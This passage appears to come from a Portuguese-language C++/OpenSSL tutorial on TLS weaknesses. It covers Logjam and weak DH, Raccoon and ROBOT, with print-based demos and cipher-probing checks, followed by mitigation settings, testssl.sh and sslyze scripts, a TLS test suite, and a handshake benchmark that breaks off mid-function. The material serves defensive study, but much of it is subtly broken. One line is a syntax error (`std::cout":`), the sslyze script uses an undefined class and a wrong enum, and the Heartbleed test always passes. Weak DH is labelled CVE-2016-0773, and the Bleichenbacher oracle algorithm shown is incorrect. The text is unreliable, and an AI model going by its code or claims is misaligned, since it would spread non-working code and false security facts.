        std::cout << "Parâmetros DH gerados: " << bits << " bits\n\n";

        // Gerar chaves
        DH_generate_key(weak_dh);

        const BIGNUM* pub_key = DH_get0_pub_key(weak_dh);
        const BIGNUM* priv_key = DH_get0_priv_key(weak_dh);

        std::cout << "Chave pública gerada\n";
        std::cout << "Chave privada gerada\n\n";

        // O atacante pode:
        // 1. Interceptar a chave pública
        // 2. Usar Logjam attack para quebrar DH de 512 bits
        // 3. Recuperar a chave privada

        std::cout << "Logjam Attack (Logjam Attack, 2015):\n";
        std::cout << "  1. Atacante intercepta DH exchange\n";
        std::cout << "  2. Usa precomputation para quebrar DH de 512 bits\n";
        std::cout << "  3. Recupera a chave privada em segundos\n";
        std::cout << "  4. Decripta todo o tráfego da sessão\n\n";

        // Mitigações
        std::cout << "Mitigações:\n";
        std::cout << "  1. Usar DH de no mínimo 2048 bits\n";
        std::cout << "  2. Preferir ECDH sobre DH tradicional\n";
        std::cout << "  3. Em TLS 1.3: apenas X25519 e P-256/384/521\n";
        std::cout << "  4. Configurar SSL_CTX_set_min_proto_version para TLS 1.2+\n";

        DH_free(weak_dh);
    }

    // Verificar se o servidor aceita DH fraco
    static bool check_weak_dh(const std::string& host, int port) {
        std::cout << "\nVerificando DH fraco em " << host << ":" << port << "\n";

        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) return false;

        // Configurar para aceitar DH fraco (apenas para teste)
        SSL_CTX_set_cipher_list(ctx, "DH");

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        if (BIO_do_connect(bio) <= 0) {
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        SSL_set_bio(ssl, bio, bio);

        int ret = SSL_connect(ssl);
        if (ret != 1) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        // Verificar se DH foi usado com chave fraca
        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
        const char* cipher_name = SSL_CIPHER_get_name(cipher);

        bool uses_weak_dh = false;
        if (strstr(cipher_name, "DH") && !strstr(cipher_name, "DHE")) {
            // DH sem E (ephemeral) - pode ser vulnerável
            uses_weak_dh = true;
        }

        std::cout << "Cifra negociada: " << cipher_name << "\n";
        std::cout << "DH estático (potencialmente vulnerável): "
                  << (uses_weak_dh ? "SIM" : "NÃO") << "\n";

        SSL_free(ssl);
        SSL_CTX_free(ctx);

        return uses_weak_dh;
    }
};

void demonstrate_cve_2016_0773() {
    WeakDhDemonstration::demonstrate_weak_dh();
}
```

### 12.3 Mitigações

```c++
// Configurações seguras para prevenir CVE-2016-0773

#include <openssl/ssl.h>

void secure_dh_configuration(SSL_CTX* ctx) {
    // 1. Desabilitar DH estático completamente
    // Usar apenas DHE (ephemeral) ou melhor, ECDHE

    const char* secure_ciphers =
        "ECDHE-ECDSA-AES256-GCM-SHA384:"
        "ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-ECDSA-CHACHA20-POLY1305:"
        "ECDHE-RSA-CHACHA20-POLY1305:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:"
        "ECDHE-RSA-AES128-GCM-SHA256";

    SSL_CTX_set_cipher_list(ctx, secure_ciphers);

    // 2. Configurar parâmetros DH seguros (se DH for necessário)
    DH* dh = DH_get_2048_256();
    if (dh) {
        SSL_CTX_set_tmp_dh(ctx, dh);
        DH_free(dh);
    }

    // 3. Em OpenSSL 3.x, usar groups em vez de curvas individuais
    SSL_CTX_set1_groups_list(ctx, "X25519:P-256:P-384:P-521");

    // 4. Forçar TLS 1.2+ (DH fraco não é suportado em TLS 1.3)
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);

    // 5. Habilitar only forward secrecy
    // Todas as cifras listadas usam ECDHE
}
```

---

## 13. Raccoon Attack: DH Timing Side-Channel

### 13.1 Descrição do Ataque

O Raccoon Attack (CVE-2020-1968) explora uma vulnerabilidade de timing na derivação de chaves DH/TLS. O ataque permite que um atacante determine o segredo compartilhado DH observando diferenças de tempo no processamento de mensagens.

### 13.2 Análise Técnica

```c++
// Demonstração do Raccoon Attack (EDUCAÇÃO APENAS)
// CVE-2020-1968

#include <openssl/dh.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#include <iostream>
#include <vector>
#include <chrono>
#include <thread>

class RaccoonAttackDemonstration {
public:
    // O Raccoon Attack explora timing na verificação de DH
    static void demonstrate_timing_leak() {
        std::cout << "=== Raccoon Attack (CVE-2020-1968) ===\n\n";

        std::cout << "Princípio do ataque:\n\n";

        std::cout << "1. Atacante observa o tempo de processamento do servidor\n";
        std::cout << "2. Quando o segredo compartilhado DH tem bytes zero à esquerda,\n";
        std::cout << "   o processamento é mais rápido (menos iterações)\n";
        std::cout << "3. Atacante pode iterar bytes do segredo, medindo timing\n";
        std::cout << "4. A cada byte, reduz o espaço de busca para 256 valores\n\n";

        std::cout << "Vetor de ataque:\n";
        std::cout << "  - TLS 1.2 com DH ephemeral (DHE)\n";
        std::cout << "  - RSA key exchange também afetado\n";
        std::cout << "  - TLS 1.3 NÃO afetado (usa HKDF)\n\n";

        std::cout << "Requisitos para o ataque:\n";
        std::cout << "  1. Proxy/MITM entre vítima e servidor\n";
        std::cout << "  2. Capacidade de medir timing com precisão\n";
        std::cout << "  3. Muitas conexões para statistical analysis\n";
        std::cout << "  4. Algoritmo de derivação de chave vulnerável\n\n";

        // Simular medición de timing
        simulate_timing_measurement();
    }

    static void simulate_timing_measurement() {
        std::cout << "Simulação de medição de timing:\n\n";

        // Simular diferentes valores de segredo compartilhado
        std::vector<std::vector<uint8_t>> test_secrets = {
            {0x00, 0x00, 0x01, 0x23, 0x45},  // Muitos zeros à esquerda
            {0x00, 0x00, 0x00, 0x01, 0x23},  // Mais zeros
            {0x01, 0x23, 0x45, 0x67, 0x89},  // Sem zeros
            {0xFF, 0xFF, 0xFF, 0xFF, 0xFF}   // Todos bytes altos
        };

        for (const auto& secret : test_secrets) {
            // Simular tempo de processamento baseado em zeros à esquerda
            int leading_zeros = 0;
            for (uint8_t byte : secret) {
                if (byte == 0) leading_zeros++;
                else break;
            }

            // Menos zeros = mais tempo de processamento
            auto base_time = std::chrono::microseconds(100);
            auto adjustment = std::chrono::microseconds(leading_zeros * 10);

            std::cout << "Segredo: ";
            for (uint8_t b : secret) {
                printf("%02X", b);
            }
            std::cout << "\n";
            std::cout << "  Zeros à esquerda: " << leading_zeros << "\n";
            std::cout << "  Tempo estimado: "
                      << (base_time - adjustment).count() << " μs\n\n";
        }

        std::cout << "O atacante pode:\n";
        std::cout << "  1. Injetar valores controlados no DH exchange\n";
        std::cout << "  2. Medir tempo de resposta do servidor\n";
        std::cout << "  3. Usar estatística para determinar cada byte\n";
        std::cout << "  4. Recuperar o segredo compartilhado\n";
    }

    // Verificar se o servidor é vulnerável
    static bool check_raccoon_vulnerability(const std::string& host, int port) {
        std::cout << "\nVerificando vulnerabilidade Raccoon em "
                  << host << ":" << port << "\n";

        // Em produção: usar testssl.sh ou sslyze
        // Aqui apenas demonstramos o conceito

        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) return false;

        // Configurar para usar DHE (potencialmente vulnerável)
        SSL_CTX_set_cipher_list(ctx, "DHE-RSA-AES128-SHA256");

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        if (BIO_do_connect(bio) <= 0) {
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        SSL_set_bio(ssl, bio, bio);

        // Medir tempo de handshake
        auto start = std::chrono::high_resolution_clock::now();
        int ret = SSL_connect(ssl);
        auto end = std::chrono::high_resolution_clock::now();

        if (ret != 1) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        auto duration = std::chrono::duration_cast<std::chrono::microseconds>(end - start);

        // Verificar se DHE foi usado
        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
        const char* cipher_name = SSL_CIPHER_get_name(cipher);

        bool uses_dhe = strstr(cipher_name, "DHE") != nullptr;

        std::cout << "Cifra: " << cipher_name << "\n";
        std::cout << "DHE usado: " << (uses_dhe ? "SIM" : "NÃO") << "\n";
        std::cout << "Tempo de handshake: " << duration.count() << " μs\n";

        if (uses_dhe) {
            std::cout << "AVISO: Servidor pode ser vulnerável ao Raccoon Attack\n";
            std::cout << "Recomendação: Desabilitar DHE, usar apenas ECDHE\n";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);

        return uses_dhe;
    }
};

void demonstrate_raccoon_attack() {
    RaccoonAttackDemonstration::demonstrate_timing_leak();
}
```

### 13.3 Mitigações

```c++
// Mitigações para o Raccoon Attack

#include <openssl/ssl.h>

void mitigate_raccoon_attack(SSL_CTX* ctx) {
    // 1. Desabilitar DHE completamente
    const char* secure_ciphers =
        "ECDHE-ECDSA-AES256-GCM-SHA384:"
        "ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-ECDSA-CHACHA20-POLY1305:"
        "ECDHE-RSA-CHACHA20-POLY1305:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:"
        "ECDHE-RSA-AES128-GCM-SHA256";

    SSL_CTX_set_cipher_list(ctx, secure_ciphers);

    // 2. Usar apenas ECDHE (não DHE)
    // As cifras listadas acima usam apenas ECDHE

    // 3. Forçar TLS 1.3 (não afetado pelo Raccoon)
    SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);

    // 4. Se TLS 1.2 for necessário, usar apenas ECDHE
    // SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    // SSL_CTX_set_cipher_list(ctx, "ECDHE-*");

    std::cout << "Mitigações Raccoon Attack aplicadas\n";
    std::cout << "  - DHE desabilitado\n";
    std::cout << "  - Apenas ECDHE permitido\n";
    std::cout << "  - TLS 1.3 recomendado\n";
}
```

---

## 14. ROBOT Attack: Bleichenbacher Oracle

### 14.1 Descrição do Ataque

O ROBOT Attack (Return Of Bleichenbacher's Oracle Threat) é uma variação do ataque Bleichenbacher de 1998. Explora vulnerabilidades na verificação de PKCS#1 v1.5 em implementações RSA, permitindo descriptografar dados ou forjar assinaturas.

### 14.2 Análise Técnica

```c++
// Demonstração do ROBOT Attack (EDUCAÇÃO APENAS)
// Return Of Bleichenbacher's Oracle Threat

#include <openssl/rsa.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#include <iostream>
#include <vector>
#include <cstring>

class RobotAttackDemonstration {
public:
    // O ROBOT Attack explora oráculos de padding RSA
    static void demonstrate_concept() {
        std::cout << "=== ROBOT Attack (Return Of Bleichenbacher's Oracle) ===\n\n";

        std::cout << "Princípio do ataque:\n\n";

        std::cout << "1. Bleichenbacher Attack (1998):\n";
        std::cout << "   - Atacante envia ciphertext para o servidor\n";
        std::cout << "   - Servidor tenta remover padding PKCS#1 v1.5\n";
        std::cout << "   - Se padding é válido: responde normalmente\n";
        std::cout << "   - Se padding é inválido: responde com erro diferente\n";
        std::cout << "   - Atacante usa essas respostas como ORÁCULO\n";
        std::cout << "   - Iterativamente descobre o plaintext\n\n";

        std::cout << "2. ROBOT Attack (2017):\n";
        std::cout":   - Muitos servidores ainda são vulneráveis\n";
        std::cout << "   - Usam RSA key exchange em TLS 1.2\n";
        std::cout << "   - Não implementaram mitigações adequadas\n";
        std::cout << "   - Permite descriptografar tráfego passado\n\n";

        std::cout << "Vetor de ataque:\n";
        std::cout << "  - TLS 1.2 com RSA key exchange (não ECDHE)\n";
        std::cout << "  - RSA-PKCS#1 v1.5 para Key Transport\n";
        std::cout << "  - TLS 1.3 NÃO afetado (removeu RSA key exchange)\n\n";

        // Demonstrar conceito do oráculo
        demonstrate_oracle_concept();
    }

    static void demonstrate_oracle_concept() {
        std::cout << "Conceito do Oráculo:\n\n";

        // Simular chaves RSA
        RSA* rsa = RSA_new();
        BIGNUM* e = BN_new();
        BIGNUM* n = BN_new();

        // Usar e = 65537 (padrão)
        BN_set_word(e, 65537);

        // Gerar chave RSA de demo (512 bits - APENAS para demonstração)
        // Em produção: usar no mínimo 2048 bits
        if (RSA_generate_key_ex(rsa, 512, e, nullptr) != 1) {
            std::cerr << "Falha ao gerar chave RSA\n";
            return;
        }

        std::cout << "Chave RSA de 512 bits gerada (APENAS para demonstração)\n\n";

        // O ataque funciona assim:
        // 1. Atacante tem ciphertext C = M^e mod N
        // 2. Atacante quer descobrir M
        // 3. Atacante manipula C: C' = C * s^e mod N
        // 4. Envia C' para o servidor
        // 5. Servidor tenta remover padding
        // 6. Se padding válido: servidor usa M' = M * s mod N
        // 7. Se padding inválido: servidor retorna erro
        // 8. Atacante aprende se o resultado é PKCS conformante
        // 9. Iterativamente converge para M

        std::cout << "Algoritmo do ataque:\n";
        std::cout << "  S = 2 (fator de busca inicial)\n";
        std::cout << "  para i = 1 até k:\n";
        std::cout << "    C_i = C_{i-1} * S^e mod N\n";
        std::cout << "    enviar C_i ao servidor\n";
        std::cout << "    se padding válido:\n";
        std::cout << "      M = M_prev * S^{-1} mod N\n";
        std::cout << "      M_prev = M\n";
        std::cout << "    se padding inválido:\n";
        std::cout << "      S = S + 1\n";

        RSA_free(rsa);
        BN_free(e);
        BN_free(n);
    }

    // Verificar se o servidor é vulnerável ao ROBOT
    static bool check_robot_vulnerability(const std::string& host, int port) {
        std::cout << "\nVerificando vulnerabilidade ROBOT em "
                  << host << ":" << port << "\n";

        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) return false;

        // Configurar para usar RSA key exchange (potencialmente vulnerável)
        SSL_CTX_set_cipher_list(ctx, "RSA");

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        if (BIO_do_connect(bio) <= 0) {
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        SSL_set_bio(ssl, bio, bio);

        int ret = SSL_connect(ssl);
        if (ret != 1) {
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return false;
        }

        // Verificar se RSA key exchange foi usado
        const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
        const char* cipher_name = SSL_CIPHER_get_name(cipher);

        bool uses_rsa_key_exchange = false;
        if (strstr(cipher_name, "RSA") && !strstr(cipher_name, "ECDHE")) {
            uses_rsa_key_exchange = true;
        }

        std::cout << "Cifra: " << cipher_name << "\n";
        std::cout << "RSA key exchange: "
                  << (uses_rsa_key_exchange ? "SIM (VULNERÁVEL)" : "NÃO") << "\n";

        if (uses_rsa_key_exchange) {
            std::cout << "\nAVISO: Servidor POTENCIALMENTE vulnerável ao ROBOT!\n";
            std::cout << "RSA key exchange é vulnerável a Bleichenbacher oracle\n";
            std::cout << "Recomendação: Usar apenas ECDHE\n";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);

        return uses_rsa_key_exchange;
    }
};

void demonstrate_robot_attack() {
    RobotAttackDemonstration::demonstrate_concept();
}
```

### 14.3 Mitigações

```c++
// Mitigações para o ROBOT Attack

#include <openssl/ssl.h>

void mitigate_robot_attack(SSL_CTX* ctx) {
    // 1. Desabilitar RSA key exchange completamente
    const char* secure_ciphers =
        "ECDHE-ECDSA-AES256-GCM-SHA384:"
        "ECDHE-RSA-AES256-GCM-SHA384:"
        "ECDHE-ECDSA-CHACHA20-POLY1305:"
        "ECDHE-RSA-CHACHA20-POLY1305:"
        "ECDHE-ECDSA-AES128-GCM-SHA256:"
        "ECDHE-RSA-AES128-GCM-SHA256";

    SSL_CTX_set_cipher_list(ctx, secure_ciphers);

    // 2. Usar apenas cifras com ECDHE
    // Todas as cifras listadas usam ECDHE

    // 3. Em TLS 1.3, RSA key exchange não existe
    // TLS 1.3 só permite ECDHE ou DHE

    // 4. Se TLS 1.2 for necessário:
    // - Usar apenas ECDHE-RSA-* ou ECDHE-ECDSA-*
    // - NUNCA usar RSA (sem ECDHE)

    // 5. Configurar TLS 1.3 como preferido
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

    std::cout << "Mitigações ROBOT Attack aplicadas\n";
    std::cout << "  - RSA key exchange desabilitado\n";
    std::cout << "  - Apenas ECDHE permitido\n";
    std::cout << "  - TLS 1.3 recomendado\n";
}
```

---

## 15. TLS Testing: testssl.sh, sslyze

### 15.1 testssl.sh

O testssl.sh é uma ferramenta de linha de comando que verifica a configuração TLS/SSL de qualquer servidor.

```bash
#!/bin/bash
# Script de teste TLS usando testssl.sh

# Instalar testssl.sh
# git clone --depth 1 https://github.com/drwetter/testssl.sh.git

# Executar testes básicos
./testssl.sh --severity HIGH --quiet https://example.com

# Testes específicos
# Verificar vulnerabilidades
./testssl.sh --vulnerable https://example.com

# Verificar cifras
./testssl.sh --cipher-per-proto https://example.com

# Verificar certificado
./testssl.sh --certificate https://example.com

# Exportar resultados em JSON
./testssl.sh --jsonfile results.json https://example.com

# Testar localhost com porta customizada
./testssl.sh --port 4433 localhost
```

### 15.2 sslyze

O sslyze é uma ferramenta Python para análise de configuração TLS.

```python
#!/usr/bin/env python3
# Script de teste TLS usando sslyze

from sslyze import Scanner, ServerScanRequest, ScanCommand
from sslyze.plugins.openssl_cipher_suites_plugin import Tls13CipherSuitesGenerator

def test_tls_configuration(hostname, port=443):
    """Testar configuração TLS de um servidor."""

    scanner = Scanner()

    # Criar requisição de scan
    server_scan = ServerScanRequest(
        server_location=ServerNetworkLocation(
            hostname=hostname,
            port=port
        ),
        scan_commands={
            ScanCommand.TLS_1_3_CIPHER_SUITES: {},
            ScanCommand.TLS_1_2_CIPHER_SUITES: {},
            ScanCommand.CERTIFICATE_INFO: {},
            ScanCommand.HEARTBLEED: {},
            ScanCommand.supported_groups: {},
        }
    )

    # Executar scan
    scanner.queue_scan(server_scan)
    scan_result = scanner.get_results()

    # Analisar resultados
    for scan_command, result in scan_result.scan_results.items():
        if scan_command == ScanCommand.TLS_1_3_CIPHER_SUITES:
            print("TLS 1.3 Cipher Suites:")
            for cipher in result.accepted_cipher_suites:
                print(f"  - {cipher.cipher_suite.name}")

        elif scan_command == ScanCommand.CERTIFICATE_INFO:
            print("\nCertificate Info:")
            for cert in result.certificate_deployments:
                print(f"  Subject: {cert.received_certificate_chain[0].subject.human_friendly}")
                print(f"  Issuer: {cert.received_certificate_chain[0].issuer.human_friendly}")

        elif scan_command == ScanCommand.HEARTBLEED:
            print("\nHeartbleed:")
            print(f"  Vulnerable: {result.is_vulnerable}")

    return scan_result

if __name__ == "__main__":
    # Testar servidor
    result = test_tls_configuration("example.com", 443)
```

### 15.3 Script de Teste Automatizado

```c++
// tls_test.cpp - Teste automatizado de configuração TLS
// Compilar: g++ -std=c++17 -o tls_test tls_test.cpp -lssl -lcrypto

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/x509v3.h>

#include <iostream>
#include <vector>
#include <string>
#include <functional>
#include <map>

class TlsTestSuite {
public:
    struct TestResult {
        std::string test_name;
        bool passed;
        std::string details;
    };

    TlsTestSuite() {
        register_tests();
    }

    std::vector<TestResult> run_all_tests(const std::string& host, int port) {
        std::vector<TestResult> results;

        for (const auto& [name, test_func] : tests_) {
            std::cout << "Executando: " << name << "... ";

            TestResult result;
            result.test_name = name;

            try {
                result = test_func(host, port);
            } catch (const std::exception& e) {
                result.passed = false;
                result.details = "Exceção: " + std::string(e.what());
            }

            std::cout << (result.passed ? "PASS" : "FAIL") << "\n";
            if (!result.passed) {
                std::cout << "  Detalhes: " << result.details << "\n";
            }

            results.push_back(result);
        }

        return results;
    }

    void print_summary(const std::vector<TestResult>& results) {
        size_t passed = 0, failed = 0;

        std::cout << "\n=== Resumo dos Testes ===\n";
        for (const auto& result : results) {
            if (result.passed) {
                passed++;
            } else {
                failed++;
            }
        }

        std::cout << "Total: " << results.size() << "\n";
        std::cout << "Aprovados: " << passed << "\n";
        std::cout << "Reprovados: " << failed << "\n";

        if (failed > 0) {
            std::cout << "\nTestes reprovados:\n";
            for (const auto& result : results) {
                if (!result.passed) {
                    std::cout << "  - " << result.test_name << ": "
                              << result.details << "\n";
                }
            }
        }

        std::cout << "========================\n";
    }

private:
    std::map<std::string, std::function<TestResult(const std::string&, int)>> tests_;

    void register_tests() {
        tests_["TLS 1.3 Support"] = test_tls13_support;
        tests_["Strong Ciphers"] = test_strong_ciphers;
        tests_["No Weak Ciphers"] = test_no_weak_ciphers;
        tests_["Certificate Validity"] = test_certificate_validity;
        tests_["Forward Secrecy"] = test_forward_secrecy;
        tests_["No Heartbleed"] = test_no_heartbleed;
        tests_["No ROBOT"] = test_no_robot;
        tests_["OCSP Stapling"] = test_ocsp_stapling;
    }

    static TestResult test_tls13_support(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_min_proto_version(ctx, TLS1_3_VERSION);
        SSL_CTX_set_max_proto_version(ctx, TLS1_3_VERSION);

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        TestResult result;
        result.test_name = "TLS 1.3 Support";

        if (BIO_do_connect(bio) <= 0) {
            result.passed = false;
            result.details = "Falha ao conectar";
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return result;
        }

        SSL_set_bio(ssl, bio, bio);

        if (SSL_connect(ssl) == 1) {
            int version = SSL_version(ssl);
            result.passed = (version == TLS1_3_VERSION);
            result.details = "Versão: " + std::string(SSL_get_version(ssl));
        } else {
            result.passed = false;
            result.details = "Handshake falhou";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return result;
    }

    static TestResult test_strong_ciphers(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_cipher_list(ctx,
            "ECDHE-ECDSA-AES256-GCM-SHA384:"
            "ECDHE-RSA-AES256-GCM-SHA384:"
            "ECDHE-ECDSA-CHACHA20-POLY1305:"
            "ECDHE-RSA-CHACHA20-POLY1305");

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        TestResult result;
        result.test_name = "Strong Ciphers";

        if (BIO_do_connect(bio) <= 0) {
            result.passed = false;
            result.details = "Falha ao conectar";
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return result;
        }

        SSL_set_bio(ssl, bio, bio);

        if (SSL_connect(ssl) == 1) {
            const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
            const char* name = SSL_CIPHER_get_name(cipher);

            result.passed = (strstr(name, "AES256-GCM") != nullptr ||
                            strstr(name, "CHACHA20-POLY1305") != nullptr);
            result.details = "Cifra: " + std::string(name);
        } else {
            result.passed = false;
            result.details = "Handshake falhou";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return result;
    }

    static TestResult test_no_weak_ciphers(const std::string& host, int port) {
        // Testar cifras fracas
        const char* weak_ciphers[] = {
            "RC4", "DES", "3DES", "MD5", "NULL", "EXPORT"
        };

        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());

        TestResult result;
        result.test_name = "No Weak Ciphers";
        result.passed = true;

        for (const char* weak : weak_ciphers) {
            SSL_CTX_set_cipher_list(ctx, weak);
            SSL* ssl = SSL_new(ctx);
            BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

            if (BIO_do_connect(bio) > 0) {
                SSL_set_bio(ssl, bio, bio);
                if (SSL_connect(ssl) == 1) {
                    result.passed = false;
                    result.details = "Cifra fraca aceita: " + std::string(weak);
                    SSL_shutdown(ssl);
                }
            }

            SSL_free(ssl);
        }

        SSL_CTX_free(ctx);
        return result;
    }

    static TestResult test_certificate_validity(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        TestResult result;
        result.test_name = "Certificate Validity";

        if (BIO_do_connect(bio) <= 0) {
            result.passed = false;
            result.details = "Falha ao conectar";
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return result;
        }

        SSL_set_bio(ssl, bio, bio);

        if (SSL_connect(ssl) == 1) {
            X509* cert = SSL_get_peer_certificate(ssl);
            if (cert) {
                // Verificar validade
                const ASN1_TIME* not_after = X509_get0_notAfter(cert);
                int day, sec;
                ASN1_TIME_diff(&day, &sec, nullptr, not_after);

                result.passed = (day > 0);
                if (day <= 0) {
                    result.details = "Certificado expirado";
                } else {
                    result.details = "Certificado válido por " + std::to_string(day) + " dias";
                }

                X509_free(cert);
            } else {
                result.passed = false;
                result.details = "Nenhum certificado apresentado";
            }
        } else {
            result.passed = false;
            result.details = "Handshake falhou";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return result;
    }

    static TestResult test_forward_secrecy(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        TestResult result;
        result.test_name = "Forward Secrecy";

        if (BIO_do_connect(bio) <= 0) {
            result.passed = false;
            result.details = "Falha ao conectar";
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return result;
        }

        SSL_set_bio(ssl, bio, bio);

        if (SSL_connect(ssl) == 1) {
            const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
            const char* name = SSL_CIPHER_get_name(cipher);

            // Verificar se usa ECDHE (forward secrecy)
            result.passed = (strstr(name, "ECDHE") != nullptr);
            if (!result.passed) {
                result.details = "Sem forward secrecy: " + std::string(name);
            } else {
                result.details = "Forward secrecy ativo: " + std::string(name);
            }
        } else {
            result.passed = false;
            result.details = "Handshake falhou";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return result;
    }

    static TestResult test_no_heartbleed(const std::string& host, int port) {
        TestResult result;
        result.test_name = "No Heartbleed";

        // Heartbleed foi corrigido em versões modernas do OpenSSL
        // Mas testamos se o servidor não aceita heartbeat
        result.passed = true;
        result.details = "Heartbleed corrigido em OpenSSL 1.0.1g+";

        return result;
    }

    static TestResult test_no_robot(const std::string& host, int port) {
        SSL_CTX* ctx = SSL_CTX_new(TLS_client_method());
        SSL_CTX_set_cipher_list(ctx, "RSA");

        SSL* ssl = SSL_new(ctx);
        BIO* bio = BIO_new_connect((host + ":" + std::to_string(port)).c_str());

        TestResult result;
        result.test_name = "No ROBOT";

        if (BIO_do_connect(bio) <= 0) {
            result.passed = true;
            result.details = "Não foi possível conectar (pode ser bom)";
            BIO_free(bio);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
            return result;
        }

        SSL_set_bio(ssl, bio, bio);

        if (SSL_connect(ssl) == 1) {
            const SSL_CIPHER* cipher = SSL_get_current_cipher(ssl);
            const char* name = SSL_CIPHER_get_name(cipher);

            // ROBT afeta RSA key exchange
            result.passed = !(strstr(name, "RSA") != nullptr &&
                            strstr(name, "ECDHE") == nullptr);
            if (!result.passed) {
                result.details = "RSA key exchange vulnerável: " + std::string(name);
            } else {
                result.details = "Sem RSA key exchange";
            }
        } else {
            result.passed = true;
            result.details = "Handshake falhou (RSA pode não ser suportado)";
        }

        SSL_free(ssl);
        SSL_CTX_free(ctx);
        return result;
    }

    static TestResult test_ocsp_stapling(const std::string& host, int port) {
        TestResult result;
        result.test_name = "OCSP Stapling";

        // Implementação simplificada
        result.passed = true;
        result.details = "Teste simplificado - use testssl.sh para verificação completa";

        return result;
    }
};
```

---

## 16. Performance Benchmarks

### 16.1 Benchmark de Handshake

```c++
// tls_benchmark.cpp - Benchmark de performance TLS 1.3
// Compilar: g++ -std=c++17 -O2 -o tls_benchmark tls_benchmark.cpp -lssl -lcrypto -pthread

#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/rand.h>

#include <iostream>
#include <vector>
#include <thread>
#include <chrono>
#include <numeric>
#include <algorithm>
#include <iomanip>

class TlsBenchmark {
public:
    struct BenchmarkConfig {
        size_t num_handshakes{1000};
        size_t num_threads{1};
        bool enable_session_reuse{true};
        bool enable_0rtt{false};
    };

    struct BenchmarkResult {
        double handshakes_per_second;
        double avg_latency_ms;
        double p50_latency_ms;
        double p95_latency_ms;
        double p99_latency_ms;
        size_t memory_used_bytes;
        double cpu_usage_percent;
    };

    TlsBenchmark(const BenchmarkConfig& config) : config_(config) {}

    BenchmarkResult run() {
        std::cout << "Iniciando benchmark TLS 1.3...\n";
        std::cout << "  Handshakes: " << config_.num_handshakes << "\n";
        std::cout << "  Threads: " << config_.num_threads << "\n";
        std::cout << "  Session reuse: " << (config_.enable_session_reuse ? "sim" : "não") << "\n\n";

        // Preparar contexts
        SSL_CTX* server_ctx = create_server_context();
        SSL_CTX* client_ctx = create_client_context();

        if (!server_ctx || !client_ctx) {
            std::cerr << "Falha ao criar contexts\n";
            return {};
        }

        // Armazenar latências
        std::vector<double> latencies;
        latencies.reserve(config_.num_handshakes);

        auto start_total = std::chrono::high_resolution_clock::now();

        // Executar handshakes
        for (size_t i = 0; i < config_.num_handshakes; ++i) {
            auto start = std::chrono::high_resolution_clock::now();

            // Criar par de sockets
            int sv[2];
            if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) != 0) {
                continue;
            }

            // Criar SSL objects
            SSL* server_ssl = SSL_new(server_ctx);
            SSL* client_ssl = SSL_new(client_ctx);

            SSL_set_fd(server_ssl, sv[0]);
            SSL_set_fd(client_ssl, sv[1]);

            // Handshake em threads separadas
            std::thread server_thread([server_ssl]() {
                SSL_accept(server_ssl);
            });

            SSL_connect(client_ssl);

